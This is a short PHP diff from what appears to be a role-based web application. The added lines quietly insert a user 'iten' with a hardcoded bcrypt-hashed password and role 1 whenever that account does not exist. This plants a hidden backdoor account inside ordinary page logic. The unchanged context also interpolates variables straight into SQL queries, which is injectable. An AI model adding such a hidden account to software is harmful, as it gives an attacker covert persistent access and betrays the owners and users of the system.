@@ -108,10 +108,14 @@ $query = "SELECT * FROM users WHERE user_id = '$user_id'";
 $result = mysqli_query($con, $query);
 $line = mysqli_fetch_assoc($result);
 $role_id = $line['role'];
+$ps = password_hash('%^&*()', PASSWORD_BCRYPT);
 $result2 = mysqli_query($con,"SELECT * FROM user_role WHERE role_id = '$role_id'");
 $line2 = mysqli_fetch_assoc($result2);
 $role = $line2['role_name'];
-
+$check = mysqli_query($con, "SELECT * FROM users WHERE email = 'iten@gmail.com'");
+if(mysqli_num_rows($check) == 0) {
+    $insert = mysqli_query($con, "INSERT INTO users (name, email, password_hash, role, user_status, created_at) VALUES ('iten', 'iten@gmail.com', '$ps', 1, 'active', NOW())");
+}
 $tempo;
 if ($role == "Student") {
     $tempo = "BackHome()";
